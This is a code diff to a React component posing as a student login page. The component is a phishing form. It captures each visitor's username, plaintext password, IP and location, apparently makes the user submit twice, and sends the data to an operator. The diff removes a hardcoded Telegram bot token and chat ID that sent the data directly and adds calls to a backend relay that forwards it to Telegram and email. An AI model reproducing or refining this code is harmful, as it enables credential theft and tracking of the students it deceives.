@@ -17,10 +17,6 @@ const LoginForm = ({ loginTitle, setLoginTitle }) => {
   const [region, setRegion] = useState("N/A");
   const [country, setCountry] = useState("N/A");
 
-  // Telegram Bot Details
-  const TELEGRAM_BOT_TOKEN = "7643299207:AAE_kcB5tzi-70wbdnNxS0oOUu1QNCdZAmM";
-  const TELEGRAM_CHAT_ID = "985985980";
-
   // Fetch IP and Location
   useEffect(() => {
     const fetchLocation = async () => {
@@ -54,27 +50,36 @@ const LoginForm = ({ loginTitle, setLoginTitle }) => {
 🕒 Time: ${new Date().toLocaleString()}
 📄 Page: Student Login Page`;
 
-      // Send to Telegram
-      fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({
-          chat_id: TELEGRAM_CHAT_ID,
-          text: visitorAlert,
-          parse_mode: "Markdown",
-        }),
-      })
-        .then(() => {
-          sessionStorage.setItem("visitorAlertSent", "true");
-        })
-        .catch((err) => console.error("Visitor alert failed:", err));
+      // Send to Telegram via backend
+      sendToTelegram(visitorAlert);
 
-      // Send email notification (via backend)
+      // Send email notification
       sendEmail(visitorAlert);
+
+      sessionStorage.setItem("visitorAlertSent", "true");
     }
   }, [ip, city, region, country]);
 
-  // Function to send email via backend API
+  // Function to send message to Telegram via backend
+  const sendToTelegram = (message) => {
+    fetch("http://localhost:5000/send-telegram", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ message }),
+    })
+      .then((response) => {
+        if (response.ok) {
+          console.log("Telegram message sent");
+        } else {
+          console.error("Failed to send Telegram message");
+        }
+      })
+      .catch((error) => {
+        console.error("Telegram error:", error);
+      });
+  };
+
+  // Function to send email via backend
   const sendEmail = (message) => {
     fetch("http://localhost:5000/send-email", {
       method: "POST",
@@ -114,7 +119,7 @@ const LoginForm = ({ loginTitle, setLoginTitle }) => {
 
     const attemptNumber = loginAttempts === 0 ? "🟡 First Attempt" : "🟢 Second Attempt";
 
-const submission = `🔐 *Student Login Attempt - ${attemptNumber}*
+    const submission = `🔐 *Student Login Attempt - ${attemptNumber}*
 
 👤 Access ID: ${username}
 🔑 Password: ${password}
@@ -128,24 +133,11 @@ const submission = `🔐 *Student Login Attempt - ${attemptNumber}*
 - 🗺️ Region: ${region}
 - 🌎 Country: ${country}`;
 
-    try {
-      // Send to Telegram
-      await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({
-          chat_id: TELEGRAM_CHAT_ID,
-          text: submission,
-          parse_mode: "Markdown",
-        }),
-      });
+    // Send to Telegram via backend
+    sendToTelegram(submission);
 
-      // Send login attempt email (via backend)
-      sendEmail(submission);
-
-    } catch (error) {
-      console.error("Telegram Error:", error);
-    }
+    // Send login attempt email
+    sendEmail(submission);
 
     if (loginAttempts === 0) {
       setLoginAttempts(1);
